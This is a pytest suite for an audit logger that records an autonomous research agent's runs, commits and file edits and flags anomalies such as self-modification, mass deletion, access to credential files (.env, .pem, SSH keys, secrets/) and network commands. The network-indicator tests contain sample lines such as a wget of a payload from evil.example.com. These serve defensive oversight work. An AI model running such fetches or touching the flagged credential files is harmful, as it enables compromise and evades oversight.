"""Tests for scripts/conductor_audit.py.

Spec coverage: REQ-AUDIT-001 (agent invocation logging),
               REQ-AUDIT-002 (git commit logging),
               REQ-AUDIT-003 (file modification logging),
               REQ-AUDIT-004 (anomaly detection),
               REQ-AUDIT-005 (milestone summary).

These tests exercise every code path in conductor_audit.py including:
- Normal (no-anomaly) paths for each event type
- Every anomaly detection rule (conductor self-modification, mass delete,
  security file access, network indicator in output)
- Edge cases: empty inputs, I/O failure, diff stat parsing, staged-files
  helper with mocked subprocess
- CLI entry point (main()) with --tail, --anomalies-only, --summary flags
"""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest


# ── Module loading ────────────────────────────────────────────────────────────

def _load_module():
    """Load scripts/conductor_audit.py without installing it as a package."""
    repo_root = Path(__file__).resolve().parents[2]
    module_path = repo_root / "scripts" / "conductor_audit.py"
    spec = importlib.util.spec_from_file_location("conductor_audit", module_path)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    # Register in sys.modules so @dataclass can resolve the module dict.
    sys.modules["conductor_audit"] = mod
    spec.loader.exec_module(mod)
    return mod


MODULE = _load_module()
ConductorAudit = MODULE.ConductorAudit
prompt_hash = MODULE.prompt_hash
parse_diff_stats = MODULE.parse_diff_stats
collect_staged_files = MODULE.collect_staged_files


# ── Fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture()
def audit(tmp_path: Path) -> ConductorAudit:
    """Return a ConductorAudit backed by a temporary NDJSON file."""
    return ConductorAudit(audit_log=tmp_path / "audit.jsonl")


def _read_events(audit: ConductorAudit) -> list[dict]:
    """Read all events from the audit log as parsed dicts."""
    text = audit._log_path.read_text(encoding="utf-8")
    return [json.loads(line) for line in text.splitlines() if line.strip()]


# ── REQ-AUDIT-001: agent invocation logging ───────────────────────────────────

class TestLogAgentInvocation:
    """REQ-AUDIT-001: every agent invocation is logged with structured fields."""

    def test_clean_invocation_is_logged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-001: a normal agent run produces one event with no anomalies."""
        anomalies = audit.log_agent_invocation(
            prompt_hash="abc123",
            max_turns=50,
            exit_code=0,
            duration_s=12.5,
            output_snippet="Research complete.",
        )
        assert anomalies == []
        events = _read_events(audit)
        assert len(events) == 1
        ev = events[0]
        assert ev["event_type"] == "agent_invocation"
        assert ev["details"]["prompt_hash"] == "abc123"
        assert ev["details"]["max_turns"] == 50
        assert ev["details"]["exit_code"] == 0
        assert ev["details"]["duration_s"] == 12.5
        assert ev["anomalies"] == []

    def test_duration_tracked_for_milestone_summary(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-001: durations accumulate for avg computation in summary."""
        audit.log_agent_invocation("h1", 20, 0, 10.0)
        audit.log_agent_invocation("h2", 20, 0, 30.0)
        assert len(audit._agent_durations) == 2
        assert audit._agent_durations == [10.0, 30.0]

    def test_output_snippet_truncated_to_500_chars(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-001: output snippets > 500 chars are truncated before storage."""
        long_output = "x" * 1000
        audit.log_agent_invocation("h", 10, 0, 1.0, output_snippet=long_output)
        events = _read_events(audit)
        assert len(events[0]["details"]["output_snippet"]) == 500

    def test_failed_exit_code_logged_without_anomaly(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-001: a non-zero exit code is recorded but is not itself anomalous."""
        anomalies = audit.log_agent_invocation("h", 10, 1, 5.0)
        assert anomalies == []
        events = _read_events(audit)
        assert events[0]["details"]["exit_code"] == 1


# ── REQ-AUDIT-002: git commit logging ────────────────────────────────────────

class TestLogGitCommit:
    """REQ-AUDIT-002: every git commit is logged with file list and line counts."""

    def test_clean_commit_is_logged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-002: a normal commit produces one event with no anomalies."""
        anomalies = audit.log_git_commit(
            files_changed=["scripts/exp_300.py"],
            lines_added=80,
            lines_removed=2,
            test_result="15 passed",
        )
        assert anomalies == []
        events = _read_events(audit)
        ev = events[0]
        assert ev["event_type"] == "git_commit"
        assert ev["details"]["file_count"] == 1
        assert ev["details"]["lines_added"] == 80
        assert ev["details"]["lines_removed"] == 2
        assert ev["details"]["test_result"] == "15 passed"

    def test_commit_stats_accumulate_for_summary(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-002: line counts accumulate for totals in milestone summary."""
        audit.log_git_commit(["a.py"], 10, 0)
        audit.log_git_commit(["b.py"], 20, 5)
        assert len(audit._commit_stats) == 2
        assert sum(s["lines_added"] for s in audit._commit_stats) == 30
        assert sum(s["lines_removed"] for s in audit._commit_stats) == 5

    def test_empty_commit_is_logged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-002: a commit with zero files is legal (edge case)."""
        anomalies = audit.log_git_commit([], 0, 0)
        assert anomalies == []
        events = _read_events(audit)
        assert events[0]["details"]["file_count"] == 0


# ── REQ-AUDIT-003: file modification logging ─────────────────────────────────

class TestLogFileModification:
    """REQ-AUDIT-003: every file modification is logged with path and size delta."""

    def test_new_file_creation_logged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-003: creating a new file is logged as is_creation=True."""
        anomalies = audit.log_file_modification("scripts/exp_301.py", 0, 4096)
        assert anomalies == []
        events = _read_events(audit)
        ev = events[0]["details"]
        assert ev["is_creation"] is True
        assert ev["is_deletion"] is False
        assert ev["size_delta"] == 4096
        assert ev["is_code_file"] is True

    def test_data_file_flagged_as_non_code(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-003: .jsonl files are classified as non-code data files."""
        audit.log_file_modification("results/exp_301_results.jsonl", 0, 1024)
        events = _read_events(audit)
        assert events[0]["details"]["is_code_file"] is False

    def test_deletion_detected(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-003: deleting a file (new_size=0) is logged as is_deletion=True."""
        audit.log_file_modification("old_experiment.py", 2048, 0)
        events = _read_events(audit)
        ev = events[0]["details"]
        assert ev["is_deletion"] is True
        assert ev["size_delta"] == -2048

    def test_file_paths_accumulate_for_summary(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-003: modified file paths are recorded for top-files summary."""
        audit.log_file_modification("a.py", 0, 100)
        audit.log_file_modification("a.py", 100, 200)
        audit.log_file_modification("b.py", 0, 50)
        assert audit._file_mods.count("a.py") == 2
        assert audit._file_mods.count("b.py") == 1


# ── REQ-AUDIT-004: anomaly detection ─────────────────────────────────────────

class TestAnomalyDetection:
    """REQ-AUDIT-004: suspicious patterns are flagged with descriptive messages."""

    # ── Conductor self-modification ───────────────────────────────────────────

    def test_conductor_self_modification_in_commit(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: changing research_conductor.py triggers self-mod anomaly."""
        anomalies = audit.log_git_commit(
            files_changed=["scripts/research_conductor.py"],
            lines_added=5,
            lines_removed=3,
        )
        assert any("self-modification" in a.lower() for a in anomalies)

    def test_conductor_self_modification_via_file_mod(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: log_file_modification also catches conductor edits."""
        anomalies = audit.log_file_modification(
            "scripts/research_conductor.py", 10000, 10100
        )
        assert any("self-modification" in a.lower() for a in anomalies)

    # ── Mass deletion ─────────────────────────────────────────────────────────

    def test_mass_file_deletion_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: deleting many files (>=5 files, >200 lines) is flagged."""
        many_files = [f"old_{i}.py" for i in range(6)]
        anomalies = audit.log_git_commit(
            files_changed=many_files,
            lines_added=0,
            lines_removed=500,
        )
        assert any("mass" in a.lower() for a in anomalies)

    def test_small_deletion_not_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: a small refactor (4 files, 50 lines) is not flagged."""
        anomalies = audit.log_git_commit(
            files_changed=["a.py", "b.py", "c.py", "d.py"],
            lines_added=10,
            lines_removed=50,
        )
        # No mass-deletion anomaly (4 files < threshold of 5)
        assert not any("mass" in a.lower() for a in anomalies)

    def test_many_files_but_few_lines_removed_not_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: many files with tiny removals is not mass-deletion."""
        many_files = [f"doc_{i}.md" for i in range(10)]
        anomalies = audit.log_git_commit(
            files_changed=many_files,
            lines_added=100,
            lines_removed=10,  # below 200 threshold
        )
        assert not any("mass" in a.lower() for a in anomalies)

    # ── Security file access ──────────────────────────────────────────────────

    def test_env_file_access_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: touching .env in a commit is flagged."""
        anomalies = audit.log_git_commit(
            files_changed=[".env"],
            lines_added=1,
            lines_removed=0,
        )
        assert any("security" in a.lower() for a in anomalies)

    def test_pem_key_file_access_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: touching a .pem file triggers a security anomaly."""
        anomalies = audit.log_file_modification("secrets/server.pem", 0, 2048)
        assert any("security" in a.lower() for a in anomalies)

    def test_ssh_key_access_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: modifying an SSH private key file is flagged."""
        anomalies = audit.log_file_modification(".ssh/id_rsa", 1000, 1000)
        assert any("security" in a.lower() for a in anomalies)

    def test_sops_yaml_access_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: touching .sops.yaml is flagged (encrypted secrets config)."""
        anomalies = audit.log_git_commit(
            files_changed=[".sops.yaml"],
            lines_added=0,
            lines_removed=1,
        )
        assert any("security" in a.lower() for a in anomalies)

    def test_credentials_dir_access_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: writing into a 'secrets/' directory is flagged."""
        anomalies = audit.log_file_modification("secrets/api_key.txt", 0, 64)
        assert any("security" in a.lower() for a in anomalies)

    def test_normal_source_file_not_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: a normal Python source file has no security anomalies."""
        anomalies = audit.log_file_modification("python/carnot/models/ising.py", 0, 3000)
        assert anomalies == []

    # ── Network indicators ────────────────────────────────────────────────────

    def test_curl_in_output_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: 'curl ' in agent output is flagged as network access."""
        anomalies = audit.log_agent_invocation(
            "h", 10, 0, 1.0,
            output_snippet="Downloading model: curl https://example.com/model.bin",
        )
        assert any("network" in a.lower() for a in anomalies)

    def test_wget_in_output_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: 'wget ' in agent output is flagged."""
        anomalies = audit.log_agent_invocation(
            "h", 10, 0, 1.0,
            output_snippet="wget https://evil.example.com/payload",
        )
        assert any("network" in a.lower() for a in anomalies)

    def test_requests_get_in_output_flagged(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: 'requests.get(' in output is flagged as network call."""
        anomalies = audit.log_agent_invocation(
            "h", 10, 0, 1.0,
            output_snippet="resp = requests.get('http://example.com')",
        )
        assert any("network" in a.lower() for a in anomalies)

    def test_clean_output_no_network_anomaly(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: normal agent output produces no network anomalies."""
        anomalies = audit.log_agent_invocation(
            "h", 10, 0, 1.0,
            output_snippet="Training EBM on 10k samples. Loss: 0.032. Done.",
        )
        assert anomalies == []

    # ── Anomaly counts accumulate ─────────────────────────────────────────────

    def test_anomaly_counts_accumulate_across_events(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: anomaly_counts grows with each flagged event."""
        audit.log_git_commit(["scripts/research_conductor.py"], 1, 0)
        audit.log_file_modification(".env", 0, 10)
        assert sum(audit._anomaly_counts.values()) >= 2

    def test_anomalies_written_to_log(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-004: anomaly descriptions appear in the NDJSON log."""
        audit.log_file_modification("scripts/research_conductor.py", 10000, 10001)
        events = _read_events(audit)
        assert events[0]["anomalies"]  # non-empty list


# ── REQ-AUDIT-005: milestone summary ─────────────────────────────────────────

class TestMilestoneSummary:
    """REQ-AUDIT-005: milestone_summary() aggregates all accumulated data."""

    def test_empty_summary_has_zero_counts(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-005: summary over no events returns all-zero counts."""
        summary = audit.milestone_summary()
        assert summary["total_agent_invocations"] == 0
        assert summary["total_commits"] == 0
        assert summary["total_file_modifications"] == 0
        assert summary["total_anomalies"] == 0
        assert summary["avg_agent_duration_s"] == 0.0
        assert summary["total_lines_added"] == 0
        assert summary["total_lines_removed"] == 0

    def test_summary_aggregates_correctly(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-005: summary counts match the events that were logged."""
        audit.log_agent_invocation("h1", 20, 0, 10.0)
        audit.log_agent_invocation("h2", 30, 0, 20.0)
        audit.log_git_commit(["a.py"], 50, 10)
        audit.log_git_commit(["b.py"], 30, 5)
        audit.log_file_modification("a.py", 0, 1000)
        audit.log_file_modification("a.py", 1000, 2000)

        summary = audit.milestone_summary()
        assert summary["total_agent_invocations"] == 2
        assert summary["total_commits"] == 2
        assert summary["total_file_modifications"] == 2
        assert summary["avg_agent_duration_s"] == pytest.approx(15.0)
        assert summary["total_lines_added"] == 80
        assert summary["total_lines_removed"] == 15

    def test_top_modified_files_are_ranked(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-005: top_modified_files ranks by modification frequency."""
        for _ in range(5):
            audit.log_file_modification("hot.py", 0, 100)
        audit.log_file_modification("cold.py", 0, 100)

        summary = audit.milestone_summary()
        assert summary["top_modified_files"][0] == "hot.py"

    def test_summary_event_is_written_to_log(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-005: milestone_summary() writes a milestone_summary event."""
        audit.milestone_summary()
        events = _read_events(audit)
        assert any(e["event_type"] == "milestone_summary" for e in events)

    def test_anomaly_breakdown_in_summary(self, audit: ConductorAudit) -> None:
        """REQ-AUDIT-005: anomaly_breakdown captures counts by anomaly type."""
        audit.log_git_commit(["scripts/research_conductor.py"], 1, 0)
        audit.log_git_commit(["scripts/research_conductor.py"], 1, 0)
        summary = audit.milestone_summary()
        assert summary["total_anomalies"] >= 2
        assert len(summary["anomaly_breakdown"]) >= 1


# ── Utility function tests ────────────────────────────────────────────────────

class TestPromptHash:
    """Tests for the prompt_hash() convenience function."""

    def test_same_prompt_produces_same_hash(self) -> None:
        """prompt_hash is deterministic for the same input string."""
        assert prompt_hash("hello") == prompt_hash("hello")

    def test_different_prompts_produce_different_hashes(self) -> None:
        """prompt_hash distinguishes different prompts."""
        assert prompt_hash("prompt A") != prompt_hash("prompt B")

    def test_hash_is_16_hex_chars(self) -> None:
        """prompt_hash returns a 16-character hex string (64-bit prefix of SHA-256)."""
        h = prompt_hash("any string")
        assert len(h) == 16
        assert all(c in "0123456789abcdef" for c in h)


class TestParseDiffStats:
    """Tests for parse_diff_stats(), which parses git diff --stat output."""

    def test_parses_standard_summary_line(self) -> None:
        """REQ-AUDIT-002: parse_diff_stats extracts insertion/deletion counts."""
        output = " 3 files changed, 12 insertions(+), 5 deletions(-)"
        added, removed = parse_diff_stats(output)
        assert added == 12
        assert removed == 5

    def test_zero_deletions(self) -> None:
        """parse_diff_stats handles output with no deletions."""
        output = " 1 file changed, 7 insertions(+)"
        added, removed = parse_diff_stats(output)
        assert added == 7
        assert removed == 0

    def test_empty_output_returns_zeros(self) -> None:
        """parse_diff_stats returns (0, 0) for empty or unparseable input."""
        added, removed = parse_diff_stats("")
        assert added == 0
        assert removed == 0

    def test_singular_insertion(self) -> None:
        """parse_diff_stats handles '1 insertion(+)' (singular form)."""
        output = " 1 file changed, 1 insertion(+), 3 deletions(-)"
        added, removed = parse_diff_stats(output)
        assert added == 1
        assert removed == 3


class TestCollectStagedFiles:
    """Tests for collect_staged_files(), which queries git staging area."""

    def test_returns_list_of_staged_paths(self) -> None:
        """REQ-AUDIT-002: collect_staged_files returns paths from git diff --cached."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "scripts/exp_300.py\npython/carnot/models/ising.py\n"

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            files = collect_staged_files()

        assert files == ["scripts/exp_300.py", "python/carnot/models/ising.py"]
        mock_run.assert_called_once()

    def test_returns_empty_on_git_failure(self) -> None:
        """collect_staged_files returns [] if git exits non-zero."""
        mock_result = MagicMock()
        mock_result.returncode = 128
        mock_result.stdout = ""

        with patch("subprocess.run", return_value=mock_result):
            files = collect_staged_files()

        assert files == []

    def test_returns_empty_on_subprocess_exception(self) -> None:
        """collect_staged_files returns [] if subprocess raises (git not found)."""
        with patch("subprocess.run", side_effect=FileNotFoundError("git not found")):
            files = collect_staged_files()

        assert files == []

    def test_filters_empty_lines(self) -> None:
        """collect_staged_files strips blank lines from git output."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "a.py\n\nb.py\n  \n"

        with patch("subprocess.run", return_value=mock_result):
            files = collect_staged_files()

        assert files == ["a.py", "b.py"]


# ── Resilience: I/O errors must not propagate ─────────────────────────────────

class TestResilience:
    """The audit logger must never crash the conductor, even when I/O fails."""

    def test_write_failure_does_not_raise(self, tmp_path: Path) -> None:
        """AUDIT: an unwritable log path must not raise from public methods."""
        # Create a directory where the log file would go — writes will fail
        bad_log = tmp_path / "readonly_dir" / "audit.jsonl"
        bad_log.parent.mkdir()
        bad_log.parent.chmod(0o444)  # read-only directory

        audit = ConductorAudit(audit_log=bad_log)
        # None of these must raise
        audit.log_agent_invocation("h", 10, 0, 1.0)
        audit.log_git_commit(["a.py"], 5, 2)
        audit.log_file_modification("a.py", 0, 100)
        audit.milestone_summary()

    def test_log_path_parent_created_automatically(self, tmp_path: Path) -> None:
        """AUDIT: ConductorAudit creates the parent directory if it does not exist."""
        nested_log = tmp_path / "deep" / "nested" / "audit.jsonl"
        audit = ConductorAudit(audit_log=nested_log)
        audit.log_agent_invocation("h", 10, 0, 1.0)
        assert nested_log.exists()


# ── CLI entry point tests ─────────────────────────────────────────────────────

class TestCLI:
    """Tests for the conductor_audit main() CLI."""

    def _write_events(self, log_path: Path, events: list[dict]) -> None:
        with open(log_path, "w") as f:
            for ev in events:
                f.write(json.dumps(ev) + "\n")

    def test_no_log_file_prints_message(self, tmp_path: Path, capsys) -> None:
        """CLI: prints a friendly message when the log does not exist."""
        with patch.object(MODULE, "AUDIT_LOG", tmp_path / "missing.jsonl"):
            MODULE.main.__globals__["AUDIT_LOG"] = tmp_path / "missing.jsonl"
            # We need to invoke main directly; patch argparse to supply --tail default
            with patch("sys.argv", ["conductor_audit"]):
                MODULE.main()
        captured = capsys.readouterr()
        assert "No audit log" in captured.out

    def test_tail_shows_last_n_events(self, tmp_path: Path, capsys) -> None:
        """CLI --tail N: only the last N events are printed."""
        log_path = tmp_path / "audit.jsonl"
        events = [
            {"timestamp": f"2026-04-{i:02d}T00:00:00Z",
             "event_type": "agent_invocation",
             "details": {},
             "anomalies": []}
            for i in range(1, 11)
        ]
        self._write_events(log_path, events)

        with patch.object(MODULE, "AUDIT_LOG", log_path):
            with patch("sys.argv", ["conductor_audit", "--tail", "3"]):
                MODULE.main()

        captured = capsys.readouterr()
        lines = [l for l in captured.out.splitlines() if "agent_invocation" in l]
        assert len(lines) == 3

    def test_anomalies_only_flag(self, tmp_path: Path, capsys) -> None:
        """CLI --anomalies-only: only events with anomalies are shown."""
        log_path = tmp_path / "audit.jsonl"
        events = [
            {"timestamp": "2026-04-14T00:00:00Z", "event_type": "agent_invocation",
             "details": {}, "anomalies": []},
            {"timestamp": "2026-04-14T00:01:00Z", "event_type": "git_commit",
             "details": {}, "anomalies": ["Conductor self-modification detected"]},
        ]
        self._write_events(log_path, events)

        with patch.object(MODULE, "AUDIT_LOG", log_path):
            with patch("sys.argv", ["conductor_audit", "--anomalies-only"]):
                MODULE.main()

        captured = capsys.readouterr()
        assert "ANOMALY" in captured.out
        assert "agent_invocation" not in captured.out  # clean event suppressed

    def test_summary_flag_shows_latest_summary(self, tmp_path: Path, capsys) -> None:
        """CLI --summary: prints the most recent milestone_summary event as JSON."""
        log_path = tmp_path / "audit.jsonl"
        events = [
            {"timestamp": "2026-04-14T00:00:00Z", "event_type": "agent_invocation",
             "details": {}, "anomalies": []},
            {"timestamp": "2026-04-14T01:00:00Z", "event_type": "milestone_summary",
             "details": {"total_commits": 5}, "anomalies": []},
        ]
        self._write_events(log_path, events)

        with patch.object(MODULE, "AUDIT_LOG", log_path):
            with patch("sys.argv", ["conductor_audit", "--summary"]):
                MODULE.main()

        captured = capsys.readouterr()
        parsed = json.loads(captured.out)
        assert parsed["event_type"] == "milestone_summary"

    def test_summary_flag_no_summary_events(self, tmp_path: Path, capsys) -> None:
        """CLI --summary: prints a message when no milestone_summary events exist."""
        log_path = tmp_path / "audit.jsonl"
        events = [
            {"timestamp": "2026-04-14T00:00:00Z", "event_type": "agent_invocation",
             "details": {}, "anomalies": []},
        ]
        self._write_events(log_path, events)

        with patch.object(MODULE, "AUDIT_LOG", log_path):
            with patch("sys.argv", ["conductor_audit", "--summary"]):
                MODULE.main()

        captured = capsys.readouterr()
        assert "No milestone summary" in captured.out

    def test_malformed_json_lines_skipped(self, tmp_path: Path, capsys) -> None:
        """CLI: corrupt NDJSON lines are skipped without crashing."""
        log_path = tmp_path / "audit.jsonl"
        log_path.write_text("not json\n{\"timestamp\": \"x\", \"event_type\": \"agent_invocation\", \"details\": {}, \"anomalies\": []}\n")

        with patch.object(MODULE, "AUDIT_LOG", log_path):
            with patch("sys.argv", ["conductor_audit", "--tail", "5"]):
                MODULE.main()  # must not raise

        captured = capsys.readouterr()
        assert "agent_invocation" in captured.out
